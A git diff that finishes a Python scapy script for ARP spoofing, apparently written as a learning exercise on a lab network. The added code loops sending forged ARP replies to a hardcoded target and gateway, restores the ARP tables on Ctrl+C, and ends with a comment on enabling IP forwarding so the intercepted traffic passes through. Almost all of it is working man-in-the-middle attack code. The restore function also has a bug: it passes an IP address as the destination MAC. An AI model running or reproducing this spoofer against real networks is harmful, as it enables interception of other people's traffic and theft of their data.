@@ -1,6 +1,6 @@
-##this project is incomplete 
-
 import scapy.all as scapy
+import time as time
+
 
 ##scapy.ls(scapy.ARP) will tell you the list of all arguments you can set in scapy.ARP
 ##op = 2 is to indicate that this is an arp response. op = 1 indicates a arp request
@@ -24,8 +24,35 @@ def get_mac(ip):
 def spoof(target_ip, spoof_ip):
     target_mac = get_mac(target_ip)
     packet = scapy.ARP(op = 2, pdst = target_ip , hwdst = target_mac , psrc =spoof_ip)
-    scapy.send(packet)
+    #verbose=false will mute the packet sent indication during execution
+    scapy.send(packet, verbose=False)
 
+def restore (destination_ip, source_ip):
+    destination_mac = get_mac(destination_ip)
+    source_mac = get_mac(source_ip)
+    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_ip, psrc= source_ip, hwsrc=source_mac)
+    scapy.send(packet, count=4, verbose=False)
 
-##spoof()
-##spoof()
+target_ip = "10.0.2.4"
+gateway_ip = "10.0.2.1"
+
+try:
+    sent_packets_count = 0
+    while True:
+        spoof(target_ip, gateway_ip)
+        spoof(gateway_ip, target_ip)
+        sent_packets_count = sent_packets_count + 2
+
+        #\r stays print from start of line and overwrite previous print
+        #end = specifies what character to add to end of print statement which we left blank
+        print("\r[+] Packets sent : " + str(sent_packets_count), end="")
+        time.sleep(2)
+except KeyboardInterrupt:
+    print ("\n[-] Detected CTRL + C .... Resetting ARP tables.")
+    restore(target_ip, gateway_ip)
+    restore(gateway_ip, target_ip)
+
+#dont for get to type echo 1 > /proc/sys/net/ipv4/ip_foward to enable packet forwarding
+#print(packet.show())
+#print(packet.summary())
+
